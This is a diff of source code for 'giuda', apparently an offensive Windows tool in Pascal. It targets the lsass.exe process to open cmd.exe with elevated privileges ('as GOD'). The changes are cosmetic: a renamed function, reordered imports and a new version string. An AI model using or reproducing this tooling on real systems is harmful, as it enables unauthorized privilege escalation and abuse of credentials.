@@ -1,7 +1,7 @@
 {$mode delphi}{$H+}
 program giuda;
 
-uses windows,classes,sysutils,uadvapi32,kerberos,usecur32,upsapi;
+uses sysutils,windows,classes,uadvapi32,kerberos,usecur32,upsapi;
 
 var
   ret,parampos:dword;
@@ -17,7 +17,7 @@ begin
  //else future scope
 end;
 
-function pungilo(cmdtorun: string;pid:string;params:string):boolean;
+function accattivalo(cmdtorun: string;pid:string;params:string):boolean;
 var
   StartupInfo: TStartupInfoW;
   ProcessInformation: TProcessInformation;
@@ -51,7 +51,7 @@ var
   debugpriv:boolean;
 begin
   verbose(' :. fox aka calipendula',1);
-  verbose('GIUDA 2023',1);
+  verbose('GIUDA 2023072100',1);
   writeln();
 
   if paramcount>0 then
@@ -108,7 +108,7 @@ begin
           verbose('Check your syntax, PID is empty',1);
           exit;
          end;
-      if pungilo('cmd.exe',pid,params)
+      if accattivalo('cmd.exe',pid,params)
          then verbose('Giuda Opened CMD as GOD...',1)
          else verbose('Error, not good...',1);
      end;
@@ -118,7 +118,7 @@ begin
   if parampos>0 then
      begin
       pid:=inttostr(upsapi._EnumProc2('lsass.exe'));
-      if pungilo('cmd.exe',pid,params)
+      if accattivalo('cmd.exe',pid,params)
          then verbose('Giuda Opened CMD as GOD...',1)
          else verbose('Error, not good...',1);
      end;
